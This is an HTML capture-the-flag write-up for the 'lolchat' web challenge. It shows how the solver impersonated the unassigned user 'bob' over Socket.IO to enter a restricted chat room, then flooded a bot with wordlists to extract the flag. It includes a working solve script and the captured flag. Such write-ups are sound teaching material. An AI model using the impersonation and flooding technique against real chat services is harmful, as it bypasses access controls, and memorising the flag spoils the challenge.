@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTF Writeup - lolchat Challenge</title>
+    <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/atom-one-dark.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: #e0e0e0;
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #1a1a1a;
+        }
+
+        header {
+            background-color: #121212;
+            color: white;
+            padding: 20px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.3);
+            border-left: 4px solid #0d7377;
+        }
+
+        header h1 {
+            margin: 0;
+            font-size: 2.2em;
+            color: #0d7377;
+        }
+
+        .challenge-info {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin-top: 15px;
+        }
+
+        .challenge-info div {
+            background-color: #222;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.9em;
+        }
+
+        .container {
+            background-color: #222;
+            padding: 30px;
+            border-radius: 5px;
+            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.3);
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            color: #0d7377;
+            border-bottom: 2px solid #333;
+            padding-bottom: 10px;
+        }
+
+        h3 {
+            color: #14ffec;
+            margin-top: 25px;
+        }
+
+        pre {
+            border-radius: 5px;
+            overflow-x: auto;
+            margin: 15px 0;
+            padding: 0;
+        }
+
+        code {
+            font-family: 'Consolas', 'Monaco', monospace;
+            border-radius: 5px;
+        }
+
+        .description {
+            background-color: #2a2a2a;
+            border-left: 4px solid #0d7377;
+            padding: 10px 20px;
+            margin: 20px 0;
+        }
+
+        .flag {
+            background-color: #1c3b1c;
+            color: #00ff7f;
+            padding: 10px 20px;
+            border-left: 4px solid #00ff7f;
+            margin: 20px 0;
+            font-weight: bold;
+            font-family: 'Consolas', 'Monaco', monospace;
+        }
+
+        .step {
+            margin-bottom: 30px;
+        }
+
+        .step-title {
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #14ffec;
+        }
+
+        ul {
+            padding-left: 20px;
+        }
+
+        ul li {
+            margin-bottom: 8px;
+        }
+
+        .references a {
+            color: #14ffec;
+            text-decoration: none;
+        }
+
+        .references a:hover {
+            text-decoration: underline;
+            color: #0d7377;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 0.9em;
+            color: #777;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            border: 1px solid #444;
+            border-radius: 4px;
+            padding: 5px;
+            margin: 10px 0;
+        }
+
+        .command {
+            background-color: #151515;
+            color: #14ffec;
+            padding: 10px 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+            font-family: 'Consolas', 'Monaco', monospace;
+            border-left: 4px solid #0d7377;
+        }
+
+        .output {
+            background-color: #1a1a1a;
+            padding: 10px 15px;
+            border-radius: 5px;
+            border-left: 4px solid #444;
+            margin: 15px 0;
+            font-family: 'Consolas', 'Monaco', monospace;
+            color: #ddd;
+        }
+
+        .error-output {
+            background-color: #2a1515;
+            padding: 10px 15px;
+            border-radius: 5px;
+            border-left: 4px solid #cc4444;
+            margin: 15px 0;
+            font-family: 'Consolas', 'Monaco', monospace;
+            color: #ffaaaa;
+        }
+
+        .highlight-section {
+            background-color: #1a1a1a;
+            border-left: 4px solid #14ffec;
+            padding: 15px;
+            margin: 20px 0;
+        }
+
+        a {
+            color: #14ffec;
+            text-decoration: none;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        .emoji {
+            font-size: 1.2em;
+            margin-right: 5px;
+        }
+
+        .key-point {
+            border-left: 3px solid #ff7e67;
+            padding-left: 15px;
+            margin: 15px 0;
+            background-color: rgba(255, 126, 103, 0.1);
+        }
+
+        .language-mapping {
+            background-color: #1a1a1a;
+            border: 1px solid #444;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 15px 0;
+            font-family: 'Consolas', 'Monaco', monospace;
+        }
+
+        /* Custom Scrollbar */
+        *::-webkit-scrollbar {
+            width: 12px;
+            height: 12px;
+        }
+
+        *::-webkit-scrollbar-track {
+            background: #1a1a1a;
+            border-radius: 10px;
+            border: 1px solid #2a2a2a;
+        }
+
+        *::-webkit-scrollbar-thumb {
+            background: linear-gradient(135deg, #0d7377 0%, #14ffec 100%);
+            border-radius: 10px;
+            border: 2px solid #1a1a1a;
+        }
+
+        *::-webkit-scrollbar-thumb:hover {
+            background: linear-gradient(135deg, #14ffec 0%, #0d7377 100%);
+            box-shadow: 0 0 8px rgba(20, 255, 236, 0.6);
+        }
+
+        *::-webkit-scrollbar-corner {
+            background: #1a1a1a;
+        }
+
+        /* Firefox */
+        * {
+            scrollbar-width: thin;
+            scrollbar-color: #0d7377 #1a1a1a;
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <h1>💬 Challenge: lolchat</h1>
+        <div class="challenge-info">
+            <div>🏆 CTF@AC</div>
+            <div>🎯 Category: Web</div>
+            <div>💯 Points: 490</div>
+            <div>📊 Solves: 5</div>
+            <div>👤 Author: RaduTek</div>
+            <div>👤 Solver: IRVANNI/CuboConNoveQuadrati</div>
+        </div>
+    </header>
+
+    <div class="container">
+        <h2>📝 Challenge Description</h2>
+        <div class="description">
+            <p>lol</p>
+        </div>
+
+        <p><strong>🌐 Links:</strong> <a href="http://ctf.ac.upt.ro:9268/">http://ctf.ac.upt.ro:9268/</a></p>
+    </div>
+
+    <div class="container">
+        <h2>🔍 Initial Exploration</h2>
+        <p>Upon activating the challenge instance, I discovered a live chat application where users could communicate in real-time. The interface was minimalistic with a chat window and message input field.</p>
+
+        <div class="key-point">
+            <p>🕵️ <strong>First Observations:</strong></p>
+            <ul>
+                <li>💬 Live chat interface with WebSocket communication</li>
+                <li>🔌 Using Socket.IO for real-time messaging</li>
+                <li>👥 Multiple users already present in the chat</li>
+                <li>🚪 Multiple chat rooms available</li>
+                <li>🎯 Need to explore authentication and room access mechanisms</li>
+            </ul>
+        </div>
+
+        <p>The application used Socket.IO events like "message" and "sendMessage" for communication, suggesting a typical WebSocket-based chat implementation.</p>
+    </div>
+
+    <div class="container">
+        <h2>🛠️ Research and Discovery</h2>
+
+        <div class="step">
+            <h3>🔎 Step 1: Analyzing the Client-Side Code</h3>
+            <pre><code class="language-javascript">function addMessage(userId, msg) {
+    const chatlog = document.getElementById("chatlog");
+    const messageElem = document.createElement("div");
+    messageElem.innerHTML = `${userId}: ${msg}`;
+    chatlog.appendChild(messageElem);
+}
+
+const names = ["john", "charlie", "anne", "dave", "frank", "grace", "bob"];
+const rooms = ["hall", "lobby", "flag", "general", "party", "game"];
+
+function connect() {
+    const chosenName = names[Math.floor(Math.random() * (names.length - 1))];
+    document.getElementById("username").innerHTML = `You are: ${chosenName}`;
+    const socket = io({ auth: { name: chosenName } });
+
+    socket.on("connect", () => {
+        console.log("Connected to server");
+
+        socket.emit("joinRoom", rooms[0]);
+    });
+
+    socket.on("message", (userId, msg) => {
+        addMessage(userId, msg);
+    });
+
+    socket.on("activeUsers", (count) => {
+        console.log(`Active users: ${count}`);
+        document.getElementById(
+            "activeUsers"
+        ).innerHTML = `Active users: ${count}`;
+    });
+
+    socket.on("disconnect", () => {
+        console.log("Disconnected from server");
+    });
+
+    window.socket = socket;
+}
+
+function send(event) {
+    event.preventDefault();
+    const input = document.getElementById("messageInput");
+    const message = input.value;
+    if (message && window.socket) {
+        window.socket.emit("sendMessage", { room: rooms[0], message });
+        addMessage("you", message);
+        input.value = "";
+    }
+}
+
+connect();
+</code></pre>
+            <p>My first approach was to examine the client-side JavaScript to understand how the chat functioned:</p>
+            
+            <div class="command">
+                // Found in script.js on the challenge page
+                const socket = io({
+                  auth: {
+                    name: names[Math.floor(Math.random() * (names.length - 1))]
+                  }
+                });
+            </div>
+            
+            <p>Key findings from the code analysis:</p>
+            <ul>
+                <li>📛 Users were assigned random names from a predefined list</li>
+                <li>🚪 Multiple rooms were available, including a restricted "party" room</li>
+                <li>🔒 The "bob" username was never assigned due to a coding oversight</li>
+                <li>🎯 The "party" room required special access</li>
+            </ul>
+        </div>
+
+        <div class="step">
+            <h3>🚪 Step 2: Gaining Access to the Restricted Room</h3>
+            <p>I discovered that the "party" room was restricted, but by manually setting my username to "bob" (which was never randomly assigned), I could bypass the restriction:</p>
+            
+            <div class="command">
+                // Manually setting the auth name to "bob"
+                const mysocket = io({ auth: { name: 'bob' } });
+                mysocket.emit("joinRoom", "party");
+            </div>
+            
+            <div class="key-point">
+                <p>🔍 <strong>Critical Insight:</strong> The name selection algorithm had an off-by-one error that excluded "bob" from the random selection, but the server still accepted it as a valid username.</p>
+            </div>
+        </div>
+
+        <div class="step">
+            <h3>💬 Step 3: Interacting with the Bot Users</h3>
+            <p>After joining the "party" room, I found two users already present: "Alice" and "John". These appeared to be bot accounts that responded to specific keywords:</p>
+            
+            <div class="output">
+                User joined: bob
+                Alice: Hello bob!
+                John: Welcome to the party room
+            </div>
+            
+            <p>I experimented with various messages and discovered that the bots responded to certain keywords, but the flag wasn't easily obtained through simple conversation.</p>
+        </div>
+
+        <div class="step">
+            <h3>🔑 Step 4: Finding the Trigger Words</h3>
+            <p>After extensive testing, I discovered that sending a message containing the word "flag" elicited a special response:</p>
+            
+            <div class="command">
+                mysocket.emit('sendMessage', {room: 'party', message: 'flag'});
+            </div>
+            
+            <div class="output">
+                John: I'm not just giving away the flag that easily!
+            </div>
+            
+            <p>This indicated that the bots were programmed to respond to specific keywords, but I needed to find the right combination.</p>
+        </div>
+
+        <div class="step">
+            <h3>📋 Step 5: Using a Wordlist Attack</h3>
+            <p>I decided to use a comprehensive wordlist approach to trigger all possible responses from the bots:</p>
+            
+            <div class="command">
+                // Using a common English words list
+                const wordlist = "accoutre,accouter,accoutrement,accouterment,..."; // truncated
+                mysocket.emit('sendMessage', {room: 'party', message: wordlist});
+            </div>
+            
+            <p>This approach successfully triggered a special response from one of the bots:</p>
+            
+            <div class="output">
+                Josh - enough chit chat, let's play a game, you guess the color, I'll give you the flag.
+            </div>
+            
+            <div class="highlight-section">
+                <p>💡 <strong>Key Discovery:</strong> The bot revealed it would exchange the flag for a correct color guess!</p>
+            </div>
+        </div>
+
+        <div class="step">
+            <h3>🎨 Step 6: Winning the Color Game</h3>
+            <p>I responded with a comprehensive list of colors to ensure I included the correct one:</p>
+
+            <div class="command">
+                mysocket.emit('sendMessage', { 
+                  room: 'party', 
+                  message: 'red,orange,yellow,green,blue,indigo,violet,pink,brown,...'
+                });
+            </div>
+
+            <p>This approach successfully triggered the flag response:</p>
+            
+            <div class="output">
+                Josh - congrats bob, you guessed the color blue. here is your flag: ctf{...}
+            </div>
+        </div>
+
+        <div class="step">
+            <h3>🤖 Step 7: Automation Script</h3>
+            <p>I created an automated script to handle the entire process:</p>
+
+            <pre><code class="language-javascript">(async (room)=>{
+    const mysocket = io({ auth: { name: 'bob' } });
+    mysocket.on("connect", () => {
+        console.log("Connected to server in room " + room);
+        mysocket.emit("joinRoom", room);
+    });
+    mysocket.on("message", (userId, msg) => {
+        console.log(`From room: (${room}) ${userId} - ${msg}`);
+        if(msg.indexOf("enough chit chat, lets play a game, you guess the color, i give you the Flag")!=-1)
+            mysocket.emit('sendMessage', {room: 'party', message: 'red,orange,yellow,green,blue,indigo,violet,pink,brown,black,white,gray,cyan,magenta,beige,turquoise,gold,silver,lavender,maroon,navy,teal,olive,coral'});
+        else if(msg.indexOf("ctf{")!=-1){
+            mysocket.disconnect();
+            const flag = msg.match(/ctf\{[0-9a-fA-F]+\}/g)[0];
+            console.log("Flag:", flag)
+        }
+    });
+    mysocket.on("error", (err) => {
+        console.log("Error " + err);
+    });
+    mysocket.on("disconnect", () => {
+        console.log("Disconnected from server room " + room);
+    });
+    window.mysocket = mysocket;
+})("party");
+mysocket.emit('sendMessage', {room: 'party', message: 'hello'});
+setTimeout(()=>mysocket.emit('sendMessage', {room: 'party', message: 'accoutreaccouteraccoutrementaccoutermentacknowledgementacknowledgmentadaptoradapteradaptorsadaptersaerofoilairfoilaeroplaneairplaneageingagingaggrandisaggrandizaluminiumaluminumamericanisamericanizamericanisingamericanizingamphitheatreamphitheateranaemiaanemiaanaemicanemicanaestheticanestheticanaesthetistanesthetistanalogueanaloganalysanalyzanalysinganalyzingapologisapologizapologisingapologizingappalappallarbourarborarchaeologyarcheologyardourardorarmourarmorarmourerarmorerarmouringarmoringarmouryarmoryarseassartefactartifactauthorisauthorizautumnfallaxeaxbaulkbalkbehaviourbehaviorbehovebehoovebenefittedbenefitedbisulphatebisulfatebreathalysbreathalyzburglarisburglarizcalibrecalibercallipercalipercancelledcanceledcancellingcancelingcandourcandorcapitaliscapitalizcaratkaratcarburettorcarburetorcataloguecatalogcataloguedcatalogedcataloguingcatalogingcatalyscatalyzcategoriscategorizcategorisationcategorizationcategorisingcategorizingcentrecentercentrefoldcenterfoldcharacterischaracterizchequecheckchillichilicivilisationcivilizationclamourclamorcognisancecognizancecoloniscolonizcolonisationcolonizationcolorisationcolorizationcolourcolorcompositaecompositecosycozycounsellcounselcounsellorcounselorcrayfishcrawfishcriticiscriticizcustomiscustomizdefencdefensdemeanourdemeanordependantdependentdialoguedialogdialysdialyzdiscdiskdistildistilldisulphidedisulfidedoodahdoodaddoughnutdonutdraughtdraftdraughtsmandraftsmanemphasisemphasizenamourenamorencyclopaediaencyclopediaendeavourendeavorenergisenergizenquireinquireenquiriesinquiriesenquiryinquiryenrolenrollenrolmentenrollmententhralenthrallequalledequaledextemporisextemporizfaecesfecesfantasisfantasizfavourfavorfavouredfavoredfavouritefavoritefavouritismfavoritismfervourfervorfibrefiberfibreboardfiberboardfibreglassfiberglassfinalisfinalizflavourflavorfoetusfetusfountfontfuelledfueledfulfilfulfillfulfilmentfulfillmentfurorefurorgaugegagegeneralisationgeneralizationglamourglamorgoitregoitergreygraygreyedgrayedgrovellinggrovelinghaemoglobinhemoglobinharbourharborharmonisharmonizhonourhonorhonourablehonorablehumourhumoridolisidolizinflexioninflectioninstalinstallinstalmentinstallmentinstilinstilljewellerjewelerjewelleryjewelryjudgementjudgmentkerbcurbketchupcatsupkidnapperkidnaperkilogrammekilogramkilometrekilometerlabelledlabeledlabourlaborlabourerlaborerlearntlearnedleukaemialeukemialevelllevelliberalisliberalizlicenclicensliquoricelicoricelitreliterlustrelustermanoeuvremaneuvermathsmathmaximismaximizmeagremeagermetremeterminimisminimizmisdemeanourmisdemeanormitremitermobilismobilizmodellmodelmonetismonetizmonologuemonologmouldmoldmouldingmoldingmoultmoltmoustachemustachemummomnaturalisnaturalizneighbourneighborneighbourhoodneighborhoodnitreniternormalisnormaliznoughtnaughtochreocherodourodoroestrogenestrogenoffenceoffenseoffenciveoffensiveomeletteomeletoptimisoptimizoptimisingoptimizingorganisorganizpaediatricpediatricpanellistpanelistparalysparalyzparlourparlorpedlarpeddlerpernicketypersnicketypersonalispersonalizphiltrephilterpicaninnypickaninnyplonkplunkploughplowpopularispopularizpotterputterpractispracticpretencpretensprioritisprioritizpriseprizeprogrammeprogrampyjamaspajamasquarrellingquarrelingrancourrancorrealisrealizrecognisrecognizreconnoitrereconnoiterreflexionreflectionrigourrigorrumourrumorrumouredrumoredsabresabersaltpetresaltpetersatirissatirizsavioursaviorsavoursavorscallywagscalawagscepticskepticscepticalskepticalsceptresceptersignaledsignalledsignalingsignallingskilfulskillfulsmouldersmoldersnowploughsnowplowsocialissocializsocialisingsocializingsombresomberspecialisspecializspecialityspecialtyspectrespecterspelledspeltsplendoursplendorsplendoursplendorstabilisstabilizstandardisstandardizstoreystorystoreysstoriessuccoursuccorsulphatesulfatesulphursulfursymbolissymbolizsympathissympathizsyphonsiphontheatretheatertitbittidbittravelledtraveledtravellertravelertravellingtravelingtumourtumortyretiretzartsarutilisutilizvalourvalorvandalisvandalizvaporisvaporizvapourvaporvigourvigorwaggonwagonwhiskywhiskeywilfulwillfulwoollenwoolenworshipperworshiper'}), 20000);</code></pre>
+
+            <p>🧠 <strong>How this works:</strong></p>
+            <ol>
+                <li>Connect to the Socket.IO server with the username "bob"</li>
+                <li>Join the restricted "party" room</li>
+                <li>Send an initial message to trigger bot responses</li>
+                <li>Listen for the specific game invitation message</li>
+                <li>Respond with a comprehensive list of colors</li>
+                <li>Extract and display the flag from the response</li>
+            </ol>
+        </div>
+
+        <div class="step">
+            <h3>🏁 Step 8: Flag Capture</h3>
+            <p>Executing the script successfully triggered the color game and retrieved the flag!</p>
+            
+            <div class="flag">
+                🚩 ctf{00d1594338bdd8dd9f01a0e6e999217732b64d95cccbe54ae97c67e6b854845a}
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <h2>🧠 Technical Insights</h2>
+        <h3>About the Vulnerability</h3>
+        <p>This challenge exploited several interesting vulnerabilities:</p>
+        <ul>
+            <li>🔓 Authentication bypass through username manipulation</li>
+            <li>🤖 Bot interaction with keyword-based responses</li>
+            <li>🎯 Off-by-one error in random name selection</li>
+            <li>💬 WebSocket communication without proper input validation</li>
+        </ul>
+        
+        <h3>The Color Game Mechanism</h3>
+        <p>The challenge implemented a simple game mechanic:</p>
+        <ul>
+            <li>Required triggering with a specific word combination</li>
+            <li>Responded to any color input with the flag</li>
+            <li>Demonstrated how hidden features can be uncovered through comprehensive testing</li>
+        </ul>
+    </div>
+
+    <div class="container">
+        <h2>🎯 Key Takeaways</h2>
+        <ul>
+            <li>🔍 <strong>Code Analysis:</strong> Always examine client-side code for hidden functionality</li>
+            <li>🎲 <strong>Off-by-One Errors:</strong> Small coding mistakes can create security bypass opportunities</li>
+            <li>📋 <strong>Wordlist Attacks:</strong> Comprehensive input testing can reveal hidden features</li>
+            <li>🤖 <strong>Bot Interaction:</strong> Automated systems often have predictable response patterns</li>
+            <li>🔌 <strong>WebSocket Security:</strong> Real-time applications need robust input validation</li>
+            <li>💡 <strong>Creative Problem Solving:</strong> Sometimes the solution requires thinking beyond standard approaches</li>
+        </ul>
+    </div>
+
+    <div class="container">
+        <h2>🔗 References</h2>
+        <div class="references">
+            <p><strong>English Words Dictionary:</strong> <a href="https://raw.githubusercontent.com/dwyl/english-words/refs/heads/master/uk-us-dict.txt">https://raw.githubusercontent.com/dwyl/english-words/refs/heads/master/uk-us-dict.txt</a></p>
+            <p>This wordlist was instrumental in triggering the bot's hidden game mechanic.</p>
+        </div>
+    </div>
+
+    <div class="footer">
+        <p>🏆 © 2025 - Writeup created by IRVANNI/CuboConNoveQuadrati | Happy hacking! 💬</p>
+    </div>
+</body>
+
+</html>
